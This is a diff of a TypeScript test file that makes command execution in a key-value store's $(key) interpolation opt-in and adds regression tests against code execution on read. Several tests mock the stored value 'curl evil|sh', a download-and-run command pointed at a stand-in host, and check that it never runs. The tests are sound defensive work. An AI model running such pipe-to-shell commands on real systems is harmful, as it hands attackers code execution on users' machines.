@@ -1,6 +1,6 @@
 import type { Mock } from 'bun:test';
 import { execSync } from 'child_process';
-import { interpolate, interpolateObject, StrictInterpolationError } from '../utils/interpolate';
+import { interpolate, interpolateExec, interpolateObject, StrictInterpolationError } from '../utils/interpolate';
 import { getValue } from '../storage';
 import { resolveKey } from '../alias';
 
@@ -270,12 +270,16 @@ describe('interpolateObject', () => {
   });
 });
 
-describe('exec interpolation $(key)', () => {
+// SECURITY: $(key) exec resolution is OPT-IN via interpolateExec(). The plain
+// interpolate() (safe default) must NEVER execute — see the dedicated
+// "safe interpolate() never executes $(key)" block below. These tests exercise
+// the exec engine through its only entry point, interpolateExec().
+describe('exec interpolation $(key) — via interpolateExec', () => {
   it('executes stored command and returns stdout', () => {
     mockGetValue.mockReturnValueOnce('echo hello');
     mockExecSync.mockReturnValueOnce('hello\n');
 
-    expect(interpolate('$(cmd)')).toBe('hello');
+    expect(interpolateExec('$(cmd)')).toBe('hello');
     expect(mockExecSync).toHaveBeenCalledWith('echo hello', expect.objectContaining({
       encoding: 'utf-8',
       timeout: 10000,
@@ -289,7 +293,7 @@ describe('exec interpolation $(key)', () => {
     });
     mockExecSync.mockReturnValue('kh\n');
 
-    expect(interpolate('$(cmd) and $(cmd)')).toBe('kh and kh');
+    expect(interpolateExec('$(cmd) and $(cmd)')).toBe('kh and kh');
     expect(mockExecSync).toHaveBeenCalledTimes(1);
   });
 
@@ -301,7 +305,7 @@ describe('exec interpolation $(key)', () => {
     });
     mockExecSync.mockReturnValueOnce('world\n');
 
-    expect(interpolate('$(cmd)')).toBe('world');
+    expect(interpolateExec('$(cmd)')).toBe('world');
     expect(mockExecSync).toHaveBeenCalledWith('echo world', expect.anything());
   });
 
@@ -313,22 +317,22 @@ describe('exec interpolation $(key)', () => {
     });
     mockExecSync.mockReturnValueOnce('hi\n');
 
-    expect(interpolate('/Users/${user}/$(cmd)')).toBe('/Users/kh/hi');
+    expect(interpolateExec('/Users/${user}/$(cmd)')).toBe('/Users/kh/hi');
   });
 
   it('throws when exec key is not found', () => {
     mockGetValue.mockReturnValueOnce(undefined);
-    expect(() => interpolate('$(missing)')).toThrow('Exec interpolation failed: "missing" not found');
+    expect(() => interpolateExec('$(missing)')).toThrow('Exec interpolation failed: "missing" not found');
   });
 
   it('throws when exec key is a subtree (not a string)', () => {
     mockGetValue.mockReturnValueOnce({ nested: 'object' });
-    expect(() => interpolate('$(subtree)')).toThrow('Exec interpolation failed: "subtree" is not a string value');
+    expect(() => interpolateExec('$(subtree)')).toThrow('Exec interpolation failed: "subtree" is not a string value');
   });
 
   it('throws when exec key is encrypted', () => {
     mockGetValue.mockReturnValueOnce('encrypted::v1:abc');
-    expect(() => interpolate('$(secret)')).toThrow('Exec interpolation failed: "secret" is encrypted');
+    expect(() => interpolateExec('$(secret)')).toThrow('Exec interpolation failed: "secret" is encrypted');
   });
 
   it('throws on non-zero exit code', () => {
@@ -337,7 +341,7 @@ describe('exec interpolation $(key)', () => {
     err.status = 42;
     mockExecSync.mockImplementationOnce(() => { throw err; });
 
-    expect(() => interpolate('$(fail)')).toThrow('Exec interpolation failed: "fail" exited with code 42');
+    expect(() => interpolateExec('$(fail)')).toThrow('Exec interpolation failed: "fail" exited with code 42');
   });
 
   it('detects circular exec references', () => {
@@ -345,7 +349,7 @@ describe('exec interpolation $(key)', () => {
       if (key === 'a') return '$(a)';
       return undefined;
     });
-    expect(() => interpolate('$(a)')).toThrow(/Circular interpolation/);
+    expect(() => interpolateExec('$(a)')).toThrow(/Circular interpolation/);
   });
 
   it('detects circular cross-type references (${} → $())', () => {
@@ -354,45 +358,74 @@ describe('exec interpolation $(key)', () => {
       if (key === 'b') return '${a}';
       return undefined;
     });
-    expect(() => interpolate('${a}')).toThrow(/Circular interpolation/);
+    expect(() => interpolateExec('${a}')).toThrow(/Circular interpolation/);
   });
 
   it('leaves $(unclosed alone (no closing paren)', () => {
-    expect(interpolate('$(unclosed')).toBe('$(unclosed');
+    expect(interpolateExec('$(unclosed')).toBe('$(unclosed');
   });
 
   it('trims whitespace in exec key reference', () => {
     mockGetValue.mockReturnValueOnce('echo ok');
     mockExecSync.mockReturnValueOnce('ok\n');
 
-    expect(interpolate('$( cmd )')).toBe('ok');
+    expect(interpolateExec('$( cmd )')).toBe('ok');
     expect(mockResolveKey).toHaveBeenCalledWith('cmd');
   });
 
   it('respects depth limit for exec interpolation', () => {
     mockGetValue.mockImplementation(() => '$(next)');
-    expect(() => interpolate('$(start)', 1)).toThrow(/depth limit exceeded/);
+    // positional allowExec=true with a shallow maxDepth
+    expect(() => interpolate('$(start)', 1, new Set(), new Map(), true)).toThrow(/depth limit exceeded/);
   });
 
   it('returns plain strings without $( unchanged', () => {
-    expect(interpolate('no exec here')).toBe('no exec here');
+    expect(interpolateExec('no exec here')).toBe('no exec here');
+    expect(mockExecSync).not.toHaveBeenCalled();
+  });
+});
+
+// SECURITY REGRESSION (read = RCE, fixed): the safe default must never run a
+// stored command. A hostile .reverie/ store shipped in a cloned repo could
+// otherwise achieve code execution the moment an agent merely READ an entry.
+describe('safe interpolate() never executes $(key)', () => {
+  it('leaves $(key) literal and does NOT execSync (single value)', () => {
+    mockGetValue.mockImplementation((key: string) => (key === 'pwn' ? 'curl evil|sh' : undefined));
+    mockExecSync.mockReturnValue('PWNED\n');
+
+    expect(interpolate('status: $(pwn)')).toBe('status: $(pwn)');
     expect(mockExecSync).not.toHaveBeenCalled();
   });
 
-  it('shares execCache across interpolateObject leaves', () => {
+  it('still resolves ${value} refs while leaving $(exec) refs literal', () => {
     mockGetValue.mockImplementation((key: string) => {
-      if (key === 'cmd') return 'whoami';
+      if (key === 'name') return 'world';
+      if (key === 'pwn') return 'curl evil|sh';
       return undefined;
     });
+    expect(interpolate('${name} $(pwn)')).toBe('world $(pwn)');
+    expect(mockExecSync).not.toHaveBeenCalled();
+  });
+
+  it('interpolateObject (read path for get --values) never executes $(key)', () => {
+    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'whoami' : undefined));
     mockExecSync.mockReturnValue('kh\n');
 
-    const result = interpolateObject({
-      a: '$(cmd)',
-      b: '$(cmd)',
-    });
+    const result = interpolateObject({ a: '$(cmd)', b: '$(cmd)' });
 
-    expect(result['a']).toBe('kh');
-    expect(result['b']).toBe('kh');
-    expect(mockExecSync).toHaveBeenCalledTimes(1);
+    expect(result['a']).toBe('$(cmd)');
+    expect(result['b']).toBe('$(cmd)');
+    expect(mockExecSync).not.toHaveBeenCalled();
+  });
+
+  it('does not execute $(key) reached indirectly through a ${value} ref', () => {
+    mockGetValue.mockImplementation((key: string) => {
+      if (key === 'wrapper') return '$(pwn)';
+      if (key === 'pwn') return 'curl evil|sh';
+      return undefined;
+    });
+    // ${wrapper} resolves to the literal text "$(pwn)" but must not then exec it
+    expect(interpolate('${wrapper}')).toBe('$(pwn)');
+    expect(mockExecSync).not.toHaveBeenCalled();
   });
 });
